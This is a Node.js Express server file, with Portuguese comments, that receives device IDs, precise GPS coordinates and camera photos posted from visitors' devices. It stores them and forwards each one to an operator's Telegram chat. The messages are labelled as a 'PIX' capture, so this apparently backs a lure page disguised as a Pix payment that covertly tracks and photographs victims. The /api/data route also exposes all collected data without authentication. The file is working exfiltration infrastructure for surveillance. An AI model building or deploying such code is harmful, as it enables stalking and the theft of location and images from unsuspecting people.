const express = require('express');
const fs = require('fs');
const path = require('path');
const fetch = require('node-fetch');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// Configuração do Telegram
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

console.log('🤖 Configuração Telegram:');
console.log('   BOT_TOKEN:', BOT_TOKEN ? '✅ Configurado' : '❌ Não configurado');
console.log('   CHAT_ID:', CHAT_ID ? '✅ Configurado' : '❌ Não configurado');

// Banco de dados
const DB_FILE = 'database.json';

function readDB() {
    try {
        return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
    } catch {
        return { locations: [], devices: [] };
    }
}

function saveDB(data) {
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

// FUNÇÃO CORRIGIDA PARA TELEGRAM
async function sendToTelegram(message, photoBase64 = null) {
    if (!BOT_TOKEN || !CHAT_ID) {
        console.log('❌ Telegram não configurado');
        return false;
    }

    try {
        if (photoBase64 && photoBase64.length > 1000) {
            // Enviar foto
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    photo: photoBase64,
                    caption: message,
                    parse_mode: 'HTML'
                })
            });
            
            const result = await response.json();
            if (!result.ok) {
                console.log('❌ Erro ao enviar foto:', result.description);
                // Tenta enviar apenas mensagem
                await sendTextToTelegram(message);
            } else {
                console.log('✅ Foto enviada para Telegram');
            }
        } else {
            // Enviar apenas texto
            await sendTextToTelegram(message);
        }
        return true;
    } catch (error) {
        console.error('❌ Erro Telegram:', error.message);
        return false;
    }
}

// Função separada para texto
async function sendTextToTelegram(message) {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        })
    });
    
    const result = await response.json();
    if (!result.ok) {
        console.log('❌ Erro mensagem:', result.description);
        return false;
    }
    console.log('✅ Mensagem enviada para Telegram');
    return true;
}

// FORMATAR MENSAGENS
function formatLocationMessage(data) {
    const mapsUrl = `https://maps.google.com/?q=${data.location.lat},${data.location.lng}`;
    const accuracy = data.location.accuracy ? data.location.accuracy.toFixed(2) + 'm' : 'N/A';
    
    return `📍 <b>NOVA LOCALIZAÇÃO - PIX</b>\n\n` +
           `📱 <b>Dispositivo:</b> <code>${data.deviceId}</code>\n` +
           `📍 <b>Coordenadas:</b> ${data.location.lat.toFixed(6)}, ${data.location.lng.toFixed(6)}\n` +
           `🎯 <b>Precisão:</b> ${accuracy}\n` +
           `🏠 <b>Endereço Aprox:</b> <a href="${mapsUrl}">Ver no Maps</a>\n` +
           `🕒 <b>Horário:</b> ${new Date(data.timestamp).toLocaleString('pt-BR')}\n` +
           `📊 <b>Tipo:</b> ${data.type || 'localização'}`;
}

function formatPhotoMessage(data) {
    return `📸 <b>FOTO CAPTURADA - PIX</b>\n\n` +
           `📱 <b>Dispositivo:</b> <code>${data.deviceId}</code>\n` +
           `🕒 <b>Horário:</b> ${new Date(data.timestamp).toLocaleString('pt-BR')}\n` +
           `📷 <b>Resolução:</b> ${data.resolution || 'Alta'}\n` +
           `💾 <b>Tamanho:</b> ${data.photo ? Math.round(data.photo.length / 1024) + 'KB' : 'N/A'}`;
}

// Rota para receber dados
app.post('/track', async (req, res) => {
    const data = req.body;
    console.log('📨 Dados recebidos:', data.type, data.deviceId);
    
    // Salvar no banco
    const db = readDB();
    data.timestamp = new Date().toISOString();
    data.id = Date.now().toString(36);
    
    db.locations.push(data);
    
    // Atualizar dispositivo
    const deviceIndex = db.devices.findIndex(d => d.deviceId === data.deviceId);
    if (deviceIndex === -1) {
        db.devices.push({
            deviceId: data.deviceId,
            firstSeen: data.timestamp,
            lastSeen: data.timestamp,
            locations: [data],
            status: 'online'
        });
    } else {
        db.devices[deviceIndex].lastSeen = data.timestamp;
        db.devices[deviceIndex].locations.push(data);
    }
    
    saveDB(db);
    
    // ENVIAR PARA TELEGRAM
    try {
        let telegramMessage = '';
        
        if (data.type && data.type.includes('location') && data.location) {
            telegramMessage = formatLocationMessage(data);
            await sendToTelegram(telegramMessage);
        }
        else if (data.type && data.type.includes('photo') && data.photo) {
            telegramMessage = formatPhotoMessage(data);
            await sendToTelegram(telegramMessage, data.photo);
        }
        else if (data.type && data.type.includes('device')) {
            telegramMessage = `📱 <b>NOVO DISPOSITIVO PIX</b>\n\n` +
                            `🆔 <b>ID:</b> <code>${data.deviceId}</code>\n` +
                            `💻 <b>Plataforma:</b> ${data.info?.platform || 'N/A'}\n` +
                            `🕒 <b>Horário:</b> ${new Date(data.timestamp).toLocaleString('pt-BR')}`;
            await sendToTelegram(telegramMessage);
        }
        
    } catch (error) {
        console.error('❌ Erro ao enviar para Telegram:', error);
    }
    
    res.json({ status: 'success', received: true });
});

// Rotas auxiliares
app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

app.get('/api/data', (req, res) => {
    res.json(readDB());
});

app.get('/test-telegram', async (req, res) => {
    const testMessage = `🧪 <b>TESTE TELEGRAM</b>\n\n` +
                       `✅ Sistema funcionando\n` +
                       `🕒 ${new Date().toLocaleString('pt-BR')}`;
    
    const success = await sendToTelegram(testMessage);
    res.json({ success: success, message: 'Teste enviado' });
});

app.listen(port, () => {
    console.log(`🚀 Sistema rodando na porta: ${port}`);
    console.log(`🤖 Telegram: ${BOT_TOKEN && CHAT_ID ? '✅ CONFIGURADO' : '❌ NÃO CONFIGURADO'}`);
});
